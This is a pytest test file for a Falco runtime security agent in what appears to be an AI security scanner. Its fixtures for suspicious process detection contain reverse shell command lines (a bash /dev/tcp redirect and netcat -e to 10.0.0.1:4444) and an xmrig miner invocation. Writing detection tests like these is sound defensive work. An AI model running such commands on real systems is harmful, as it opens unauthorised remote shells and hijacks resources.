"""Tests for FalcoRuntimeAgent (v1.7.0)."""

from __future__ import annotations

from unittest.mock import MagicMock

import pytest

from aisec.agents.falco_runtime import FalcoRuntimeAgent, _RULES_PATH
from aisec.core.enums import AgentPhase, Severity


class TestFalcoRuntimeMetadata:
    """Test agent class attributes."""

    def test_name(self):
        assert FalcoRuntimeAgent.name == "falco_runtime"

    def test_phase(self):
        assert FalcoRuntimeAgent.phase == AgentPhase.DYNAMIC

    def test_frameworks(self):
        assert "LLM06" in FalcoRuntimeAgent.frameworks
        assert "ASI10" in FalcoRuntimeAgent.frameworks
        assert "LLM01" in FalcoRuntimeAgent.frameworks

    def test_depends_on(self):
        assert "runtime_behavior" in FalcoRuntimeAgent.depends_on

    def test_description(self):
        assert "Falco" in FalcoRuntimeAgent.description
        assert "sidecar" in FalcoRuntimeAgent.description


class TestFalcoRuntimeNoContainer:
    """Test behavior when no container is available."""

    async def test_no_container_skips(self, scan_context):
        agent = FalcoRuntimeAgent(scan_context)
        await agent.analyze()
        assert len(agent.findings) == 0

    async def test_falco_disabled_skips(self, scan_context):
        scan_context.config.falco_enabled = False
        scan_context.container_id = "abc123"
        agent = FalcoRuntimeAgent(scan_context)
        await agent.analyze()
        assert len(agent.findings) == 0

    async def test_no_docker_manager_skips(self, scan_context):
        scan_context.config.falco_enabled = True
        scan_context.container_id = "abc123"
        scan_context.docker_manager = None
        agent = FalcoRuntimeAgent(scan_context)
        await agent.analyze()
        assert len(agent.findings) == 0


class TestFalcoRulesFile:
    """Test that the rules file exists and is valid."""

    def test_rules_file_exists(self):
        assert _RULES_PATH.exists()

    def test_rules_file_is_yaml(self):
        import yaml
        with open(_RULES_PATH) as f:
            rules = yaml.safe_load(f)
        assert isinstance(rules, list)
        assert len(rules) >= 7

    def test_rules_have_required_fields(self):
        import yaml
        with open(_RULES_PATH) as f:
            rules = yaml.safe_load(f)
        for rule in rules:
            assert "rule" in rule
            assert "desc" in rule
            assert "condition" in rule
            assert "output" in rule
            assert "priority" in rule


class TestCheckModelFilesInTmp:
    """Test the _check_model_files_in_tmp method."""

    def test_no_files(self, scan_context):
        agent = FalcoRuntimeAgent(scan_context)
        agent._check_model_files_in_tmp("")
        assert len(agent.findings) == 0

    def test_model_files_found(self, scan_context):
        agent = FalcoRuntimeAgent(scan_context)
        output = "/tmp/model.pt\n/tmp/weights.onnx\n"
        agent._check_model_files_in_tmp(output)
        assert len(agent.findings) == 1
        assert "Model files in temporary" in agent.findings[0].title
        assert agent.findings[0].severity == Severity.MEDIUM


class TestCheckSuspiciousProcesses:
    """Test the _check_suspicious_processes method."""

    def test_no_suspicious(self, scan_context):
        agent = FalcoRuntimeAgent(scan_context)
        ps_output = "USER  PID  CMD\nroot  1  /bin/sh\napp  42  python app.py\n"
        agent._check_suspicious_processes(ps_output)
        assert len(agent.findings) == 0

    def test_miner_detected(self, scan_context):
        agent = FalcoRuntimeAgent(scan_context)
        ps_output = "USER  PID  CMD\nroot  1  /bin/sh\nnobody  99  xmrig --threads=4\n"
        agent._check_suspicious_processes(ps_output)
        assert len(agent.findings) == 1
        assert agent.findings[0].severity == Severity.CRITICAL
        assert "miner" in agent.findings[0].title.lower()

    def test_reverse_shell_detected(self, scan_context):
        agent = FalcoRuntimeAgent(scan_context)
        ps_output = "USER  PID  CMD\nroot  1  bash -i >& /dev/tcp/10.0.0.1/4444\n"
        agent._check_suspicious_processes(ps_output)
        assert len(agent.findings) >= 1

    def test_multiple_suspicious(self, scan_context):
        agent = FalcoRuntimeAgent(scan_context)
        ps_output = "root  1  xmrig\nroot  2  nc -e /bin/sh 10.0.0.1 4444\n"
        agent._check_suspicious_processes(ps_output)
        assert len(agent.findings) >= 2


class TestDeployFalco:
    """Test Falco sidecar deployment."""

    async def test_deployment_failure_creates_info_finding(self, scan_context):
        scan_context.config.falco_enabled = True
        scan_context.config.falco_image = "falcosecurity/falco-no-driver:latest"

        mock_dm = MagicMock()
        mock_dm.deploy_sidecar.side_effect = Exception("Docker not available")

        agent = FalcoRuntimeAgent(scan_context)
        result = await agent._deploy_falco(mock_dm, "target-abc")
        assert result is None
        assert len(agent.findings) == 1
        assert agent.findings[0].severity == Severity.INFO
        assert "deployment failed" in agent.findings[0].title.lower()
